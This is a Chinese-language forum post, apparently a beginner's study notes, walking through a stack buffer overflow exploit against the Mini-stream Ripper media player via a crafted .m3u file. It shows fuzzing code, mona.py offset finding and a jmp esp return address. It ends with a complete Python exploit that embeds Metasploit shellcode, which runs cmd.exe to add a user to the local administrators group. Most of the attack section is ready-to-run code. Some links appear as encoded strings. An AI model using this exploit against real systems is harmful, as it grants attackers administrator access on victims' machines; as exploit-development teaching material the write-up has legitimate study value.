
# [原创]Mini-streamRipper_regnow缓冲区溢出利用

## 0x00 前记

新手一枚，刚开始接触缓冲区溢出，发现这玩意真的挺难的，幸的Bigtang不耐其烦的教我，是我有幸能进入缓冲区溢出道上。好了，本人比较渣，但笔记还是得做的，我想把我学习的过程分享出来，希望对于很多和我一样的新手有点帮助，足以。

## 0x01 漏洞简要描述

漏洞程序为某多媒体播放软件，在打开播放文件时候，未对文件大小作检查，直接复制到内存。攻击者可以构造恶意文件覆盖EIP从而执行任意代码。

![](https://bbs.kanxue.com/upload/attach/201507/686289_lwuqnmzeedlga0g.png)

## 0X02 检测溢出点

溢出发生在打开文件的时候，我们可以用python构造超长的文件，使得程序发生溢出。

```
_author__ = 'Netfairy_'

filename="C:\\Documents and Settings\\All Users\\桌面\\test.m3u" #待写入的文件名

myfile=open(filename,'w')  #以写方式打开文件

filedata="A"*30000 #待写入的数据

myfile.write(filedata)  #写入数据

myfile.close()  #关闭文件
```

![](https://bbs.kanxue.com/upload/attach/201507/686289_vcm84evu1zyxhq8.png)

这里演示用`mona.py`计算溢出点，安装好debugger和mona插件以后。在command窗口输入`30000`为溢出字符串的长度

```
!mona pattern_create 3000
```

![](https://bbs.kanxue.com/upload/attach/201507/686289_x9zww1gygm24ng5.png)

然后打开`pattern.txt`。复制其中的字符串作为我们的溢出字符串。然后用这个字符串重新构造我们的恶意文件。接着打开它。异常，用debugger跟进去

![](https://bbs.kanxue.com/upload/attach/201507/686289_ods2kb3s2xadp4y.png)

发现EIP被覆盖为`48306D48`，输入

```
!mona pattern_offset 0x48306D48
```

![](https://bbs.kanxue.com/upload/attach/201507/686289_mpawq8byi3oimuo.png)

如图可以看到溢出在`5820+20280=26100`处

## 0x03 开始溢出

我们可以构造这样的`exploit`

```
填充字符串（26100）+jmp esp地址(4)+shellcode
```

我们随便查找一个`jmp esp`地址（注意不应有坏地址）

![](https://bbs.kanxue.com/upload/attach/201507/686289_omefr8ms9ks0f2i.png)

在`metasploit`找一段添加用户的`shellcode`

```
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"\
      "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"\
      "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"\
      "\x34\xaf\x01\xc6\x45\x81\x3e\x57\x69\x6e\x45\x75\xf2\x8b\x7a"\
      "\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf"\
      "\xfc\x01\xc7\x68\x4b\x33\x6e\x01\x68\x20\x42\x72\x6f\x68\x2f"\
      "\x41\x44\x44\x68\x6f\x72\x73\x20\x68\x74\x72\x61\x74\x68\x69"\
      "\x6e\x69\x73\x68\x20\x41\x64\x6d\x68\x72\x6f\x75\x70\x68\x63"\
      "\x61\x6c\x67\x68\x74\x20\x6c\x6f\x68\x26\x20\x6e\x65\x68\x44"\
      "\x44\x20\x26\x68\x6e\x20\x2f\x41\x68\x72\x6f\x4b\x33\x68\x33"\
      "\x6e\x20\x42\x68\x42\x72\x6f\x4b\x68\x73\x65\x72\x20\x68\x65"\
      "\x74\x20\x75\x68\x2f\x63\x20\x6e\x68\x65\x78\x65\x20\x68\x63"\
      "\x6d\x64\x2e\x89\xe5\xfe\x4d\x53\x31\xc0\x50\x55\xff\xd7"
```

最后，完整的`exploit`构造是

```
#author 5f5K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3&6W2N6r3k6S2K9i4u0&6i4K6u0W2L8X3g2@1i4K6t1K6

filename="C:\\Documents and Settings\\All Users\\桌面\\test.m3u" #待写入的文件名

myfile=open(filename,'w')  #以写方式打开文件

filedata="A"*26100+'\xDB\xFC\x3A\x75'+'\x90\x90\x90\x90'+"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"\
      "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"\
      "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"\
      "\x34\xaf\x01\xc6\x45\x81\x3e\x57\x69\x6e\x45\x75\xf2\x8b\x7a"\
      "\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf"\
      "\xfc\x01\xc7\x68\x4b\x33\x6e\x01\x68\x20\x42\x72\x6f\x68\x2f"\
      "\x41\x44\x44\x68\x6f\x72\x73\x20\x68\x74\x72\x61\x74\x68\x69"\
      "\x6e\x69\x73\x68\x20\x41\x64\x6d\x68\x72\x6f\x75\x70\x68\x63"\
      "\x61\x6c\x67\x68\x74\x20\x6c\x6f\x68\x26\x20\x6e\x65\x68\x44"\
      "\x44\x20\x26\x68\x6e\x20\x2f\x41\x68\x72\x6f\x4b\x33\x68\x33"\
      "\x6e\x20\x42\x68\x42\x72\x6f\x4b\x68\x73\x65\x72\x20\x68\x65"\
      "\x74\x20\x75\x68\x2f\x63\x20\x6e\x68\x65\x78\x65\x20\x68\x63"\
      "\x6d\x64\x2e\x89\xe5\xfe\x4d\x53\x31\xc0\x50\x55\xff\xd7"

myfile.write(filedata)  #写入数据

myfile.close()  #关闭文件
```

值得注意的是，这里我在`JMP ESP`地址后面加了四个`\x90`。因为我发现程序在`return`后`esp`并不指向返回地址的后面，而是指向返回地址+4的地方。大家看

![](https://bbs.kanxue.com/upload/attach/201507/686289_co9mcl6hy4d6rzu.png)

然后，运行我们构造的恶意文件`test.m3u`

![](https://bbs.kanxue.com/upload/attach/201507/686289_v9ewm32o2yrufp0.png)

`exploit`执行成功，成功添加新用户。

## 0x04 参考

986K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4R3H3k6r3q4&6i4K6u0W2L8h3g2Q4x3V1k6A6L8X3c8W2P5q4)9J5k6i4m8Z5M7q4)9J5c8X3q4J5j5$3S2A6N6X3g2K6i4K6u0r3k6Y4c8H3i4K6u0V1L8%4k6W2M7X3k6D9L8%4N6Q4x3X3c8S2L8X3c8Q4x3X3c8W2P5s2m8D9L8$3W2@1i4K6u0V1N6$3W2@1K9q4)9J5k6r3#2W2N6r3q4K6M7r3I4G2K9i4c8Q4x3X3g2Z5N6r3#2D9

113K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2W2P5s2m8D9L8$3W2@1i4K6u0V1k6r3u0Q4x3X3g2U0L8$3@1`.

【注】原文首发在我的博客：7d1K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3&6W2N6r3k6S2K9i4u0&6i4K6u0W2L8X3g2@1i4K6u0o6i4@1f1$3i4@1q4o6i4@1p5J5i4@1f1^5i4@1u0r3i4K6S2q4i4@1f1#2i4K6R3#2i4@1t1@1i4@1f1^5i4@1t1$3i4@1p5K6i4@1f1%4i4K6W2n7i4@1t1^5i4@1f1#2i4K6V1H3i4K6S2o6i4@1f1%4i4K6W2m8i4K6R3@1i4@1f1$3i4K6W2o6i4K6S2n7i4@1f1#2i4K6S2r3i4K6S2n7i4@1f1@1i4@1t1^5i4K6R3H3i4@1f1^5i4@1t1#2i4@1t1%4i4@1f1#2i4@1q4p5i4@1p5$3i4@1f1@1i4@1t1&6i4@1p5H3i4K6N6q4i4K6N6q4i4K6N6q4

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

上传的附件：

- [1.png](javascript:void(0);)

  （63.48kb，7次下载）

- [2.png](javascript:void(0);)

  （81.05kb，4次下载）

- [3.png](javascript:void(0);)

  （16.26kb，4次下载）

- [4.png](javascript:void(0);)

  （19.40kb，3次下载）

- [5.png](javascript:void(0);)

  （9.46kb，3次下载）

- [6.png](javascript:void(0);)

  （22.06kb，3次下载）

- [7.png](javascript:void(0);)

  （16.27kb，3次下载）

- [8.png](javascript:void(0);)

  （143.77kb，4次下载）
